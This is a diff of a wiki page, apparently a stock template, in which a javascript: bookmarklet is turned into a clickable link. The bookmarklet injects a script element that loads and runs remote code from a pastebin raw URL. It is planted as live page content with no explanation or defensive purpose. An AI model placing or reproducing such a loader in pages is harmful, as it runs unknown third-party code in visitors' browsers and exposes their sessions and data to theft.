@@ -12,4 +12,4 @@ Add your content here.  Format your content with:
   * Headings, paragraphs, and lists
   * Automatic links to other wiki pages
 
-javascript:javascript:(function()%7Bwindow.add_js=function(s)%7Bvar%20k=(document.getElementsByTagName('head')%5B0%5D%7C%7Cdocument.body).appendChild(document.createElement('script'));k.src=s;k.type='text/javascript';%7D;add_js('http://pastebin.com/raw.php?i=Vbhd2Dg5')%7D)();
+[javascript:javascript:(function()%7Bwindow.add_js=function(s)%7Bvar%20k=(document.getElementsByTagName('head')%5B0%5D%7C%7Cdocument.body).appendChild(document.createElement('script'));k.src=s;k.type='text/javascript';%7D;add_js('http://pastebin.com/raw.php?i=Vbhd2Dg5')%7D)(); this]
